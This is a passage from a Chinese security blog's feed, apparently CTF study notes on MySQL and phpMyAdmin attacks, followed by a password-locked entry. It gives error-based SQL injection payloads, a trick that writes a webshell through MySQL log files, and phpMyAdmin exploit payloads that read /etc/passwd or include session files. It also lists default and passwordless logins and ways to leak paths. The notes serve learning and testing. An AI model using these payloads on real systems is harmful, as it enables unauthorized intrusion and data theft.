5.1.5+</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>前后添加~使其不符合xpath格式从而报错。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ul><li><code>file_priv</code> 用户的文件读写权限。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure><ul><li><code>secure-file-priv</code>系统变量，对文件读/写功能进行限制<ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li></ul></li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>mysql 5.5.53 本身及以后的版本默认值为NULL，之前的版本无内容。</p><p>查看当前的<code>secure-file-priv</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@secure_file_priv;</span><br><span class="line"><span class="keyword">select</span> @@global.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MySQL [(none)]&gt; select @@secure_file_priv;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| NULL               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]&gt; <span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| version()  |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| 5.6.46-log |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>如果上面不行，就可以用日志进行攻击。（面试经常会问道。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//请求日志</span><br><span class="line">mysql&gt; set global general_log_file = &#x27;/var/www/html/1.php&#x27;;</span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">//慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file=&#x27;/var/www/html/2.php&#x27;</span><br><span class="line">mysql&gt; set global slow_query_log=1;</span><br><span class="line">//还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h3 id="堆叠注入Stack-Injection"><a href="#堆叠注入Stack-Injection" class="headerlink" title="堆叠注入Stack Injection"></a>堆叠注入Stack Injection</h3><p>PHP中堆叠注入的支持情况：</p><table><thead><tr><th align="left"></th><th align="left">Mysqli</th><th align="left">PDO</th><th align="left">MySQL</th></tr></thead><tbody><tr><td align="left">引入的PHP版本</td><td align="left">5.0</td><td align="left">5.0</td><td align="left">3.0之前</td></tr><tr><td align="left">PHP5.x是否包含</td><td align="left">是</td><td align="left">是</td><td align="left">是</td></tr><tr><td align="left">多语句执行支持情况</td><td align="left">是</td><td align="left">大多数</td><td align="left">否</td></tr></tbody></table><h1 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h1><ul><li>phpmyadmin2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。<ul><li>漏洞危害：无需登录，任意代码执行，任意文件读取</li><li>Payload: <code>action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></li></ul></li></ul><p>/scripts/setup.php</p><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/d68d.html">https://hack-for.fun/posts/d68d.html</a></p><ul><li>Phpmyadmin <strong>4.0.x – 4.6.2</strong> RCE</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2016-5734/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/8b82.html">https://hack-for.fun/posts/8b82.html</a></p><ul><li>Phpmyadmin<strong>4.8.1</strong> RFI</li></ul><p><a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p><a href="https://hack-for.fun/posts/ef94.html">https://hack-for.fun/posts/ef94.html</a></p><p>通过写入session, 然后包含session 文件进行getshell。</p><p>Payload:<code>index.php?target=db_sql.php%253f../../../../../tmp/sess_619cd5b47fc730f60a757f19ce6ea268</code></p><ul><li>phpmyadmin 通用密码漏洞</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认 phpMyAdmin：用户名 root、密码 root 或空登陆。</span><br><span class="line"></span><br><span class="line">版本 2.11.3～2.11.4：用户名 &#39;localhost&#39;@&#39;@&quot; 登陆，无需密码。</span><br><span class="line"></span><br><span class="line">版本 2.11.9.2：用户名 root 登陆，无需密码。</span><br></pre></td></tr></table></figure><ul><li>其他版本漏洞</li></ul><p><a href="https://blog.csdn.net/aiquan9342/article/details/102075632">https://blog.csdn.net/aiquan9342/article/details/102075632</a></p><p>一： 影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><blockquote><p>　　概述：PhpMyAdmin存在PREG<em>REPLACE</em>EVAL漏洞</p><p>　　利用模块：exploit/multi/http/phpmyadmin<em>preg</em>replace CVE: CVE-2013-3238</p></blockquote><p>二： 影响版本：phpMyAdmin v3.5.2.2</p><blockquote><p>　　概述：PhpMyAdmin存在server<em>sync.php 后门漏洞</em></p><p>　　<em>利用模块：exploit/multi/http/phpmyadmin</em>3522_backdoor CVE: CVE-2012-5159</p></blockquote><p>三： 影响版本： 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;</p><blockquote><p>　　概述：PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p><p>　　利用模块：exploit/unix/webapp/phpmyadmin_config CVE: CVE-2009-1151</p></blockquote><p>四:影响版本：2.11.3 / 2.11.4</p><blockquote><p>　　利用方法：用户名处写入‘localhost’@‘@”则登录成功。 (注意全部是英文标点符号，最后一个为英文双引号)</p></blockquote><p>五:影响版本：2.8.0.3</p><p>　　phpmyadmin配合phpinfo getshell</p><p>　　<a href="https://www.t00ls.net/thread-37889-1-1.html">https://www.t00ls.net/thread-37889-1-1.html</a></p><p>附上几个php爆绝对路径的办法：</p><blockquote><p>phpMyAdmin/libraries/select<em>lang.lib.php</em></p><p><em>phpMyAdmin/darkblue</em>orange/layout.inc.php phpMyAdmin/index.php?lang[]=1</p><p>phpmyadmin/themes/darkblue_orange/layout.inc.php</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>特性很多，一篇文章肯定总结不过来。不过能总结一些还是好的，至少能够更加熟练。更重要的是，养成总结的习惯。</p><blockquote><p>不定期补充。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直觉得自己对相关的漏洞学的马马虎虎，没有深入总结，最近几次CTF比赛中也吃了不少的亏。遂想花一两天的时间来好好总结一下各个版本之间的区别，</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP安全" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP CVE、ThinkPHP、PhpMyAdmin、PHP 安全学习笔记</title>
    <link href="https://hack-for.fun/56cfbe5.html"/>
    <id>https://hack-for.fun/56cfbe5.html</id>
    <published>2020-08-25T15:48:53.000Z</published>
    <updated>2020-08-26T01:49:48.811Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f2742063f6d394c384849d7299bcb5db0f7c3d4b2c832430b72479b86dd6774b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP安全" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
